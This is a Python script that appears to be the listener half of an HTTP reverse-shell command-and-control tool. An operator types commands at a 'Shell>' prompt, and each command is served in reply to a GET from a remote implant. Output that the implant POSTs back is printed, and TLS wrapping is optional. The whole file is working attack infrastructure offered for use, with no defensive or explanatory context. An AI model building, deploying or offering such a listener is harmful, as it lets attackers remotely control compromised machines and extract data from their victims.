import http.server
import argparse as ap

def connection(host, port, enc):
    try:
        server_class = http.server.HTTPServer
        httpd = server_class((host, port), MyHandler)
        if enc:
            import ssl
            # openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
            httpd.socket = ssl.wrap_socket(httpd.socket, keyfile='serverkey.pem', certfile='servercert.pem', server_side=True)
    except Exception as e:
        print('Could not bring the server up!')
        raise e

    try:
        print('Server is up. Waiting for connection...')
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('[!] Server is terminated')
        httpd.server_close()

class MyHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(s):
        command = input("Shell> ")
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        s.wfile.write(command.encode('latin'))

    def do_POST(s):
        s.send_response(200)
        s.end_headers()
        length  = int(s.headers['Content-Length'])
        postVar = s.rfile.read(length)
        print(postVar.decode())

if __name__ == '__main__':
    parser = ap.ArgumentParser()
    parser.add_argument('-i', '--ip', help='The IP address to bind to.', required=True)
    parser.add_argument('-p', '--port', help='The port to connect to.', required=True, type=int)
    parser.add_argument('-s', '--ssl', help='Use this flag if you want to encrypt your connection.', action='store_true')
    args = parser.parse_args()

    connection(args.ip, args.port, args.ssl)
